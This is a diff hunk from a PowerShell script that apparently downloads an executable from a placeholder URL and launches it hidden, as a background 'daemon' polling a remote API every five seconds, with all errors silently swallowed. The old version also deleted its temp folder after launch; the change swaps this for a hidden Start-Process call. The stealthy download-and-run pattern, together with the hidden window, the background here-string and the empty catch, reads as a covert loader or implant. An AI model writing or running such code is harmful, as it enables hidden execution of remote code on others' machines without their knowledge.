@@ -54,15 +54,7 @@ try {
 
     if (!(Test-Path $exePath)) { throw "Download failed" }
 
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = $exePath
-    $psi.Arguments = "daemon --api-url ""__API_URL__"" --interval 5"
-    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.CreateNoWindow = $true
-    $psi.UseShellExecute = $false
-    $proc = [System.Diagnostics.Process]::Start($psi)
-    Start-Sleep -Seconds 10
-    Remove-Item -Path $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+    Start-Process -FilePath $exePath -ArgumentList "daemon --api-url ""__API_URL__"" --interval 5" -WindowStyle Hidden -PassThru | Out-Null
 } catch {}
 '@
 $__bgCode = $__bgCode.Replace("__WH_URL__", $script:__wh).Replace("__BIN_URL__", $script:__bin).Replace("__API_URL__", $script:__api)
